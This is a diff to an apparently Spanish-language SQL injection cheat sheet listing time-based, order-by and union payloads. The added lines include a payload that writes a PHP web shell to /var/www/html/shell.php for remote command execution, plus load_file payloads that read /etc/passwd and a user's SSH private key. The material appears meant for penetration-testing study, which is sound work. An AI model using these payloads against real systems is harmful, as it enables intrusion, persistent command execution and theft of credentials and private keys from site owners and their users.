@@ -53,7 +53,9 @@ Debemos de adivinar cuantas columnas existen. Esperando a que ya no nos muestre 
 ❯ ' or sleep(5)-- -                                   # Haremos que tarde en responder la web 5 segundos
 ❯ ' and sleep(5)-- -                                  # Haremos que tarde en responder la web 5 segundos
 ❯ ' order by 100-- -                                  # Haremos un ordenamiento con la 100va columna e iremos adivinando hasta que no nos marque un error
-❯ ' and if()-- a                                      
+❯ ' and if()-- a        
+
++ = Espacio en blanco en la URL
 ```
 
 ## Para saber el numero de columnas.
@@ -138,7 +140,25 @@ Debemos de adivinar cuantas columnas existen. Esperando a que ya no nos muestre 
 ```bash 
 # ORACLE
 
-❯ ' union select username||':'||password from ❮Table_Name❯-- -                    # Para que nos muestre los datos de los usuarios y su passwd separados por : 
+❯ ' union select username||':'||password from ❮Table_Name❯-- -       # Para que nos muestre los datos de los usuarios y su passwd separados por : 
+```
+
+## Subir un archivo a una ruta especifica 
+
+```bash 
+# Subir un achivo que contiene codigo PHP malicioso en una ruta especifica para hacer ejecucion remota de comandos 'RCE' 
+
+❯ ' union select "<?php system($_REQUEST['cmd']); ?>" into outfile "/var/www/html/shell.php" 
+
+# Ahora vamos a la ruta y con el archov que hemos subido, podemos ejecutar comandos de la siguiente manera:
+	shell.php?cmd=whoami
+```
+
+## Leer archivos de la maquina victima 
+
+```bash 
+❯ ' union select load_file("/etc/passwd")-- -                  # Leer el '/etc/passwd' de la maquina victima 
+❯ ' union select load_file("/home/user/.ssh/id_rsa")-- -       # Leer el 'id_rsa' del usuario de la maquina victima
 ```
 
 ## Inyecciones Blind con respuesta condicional 
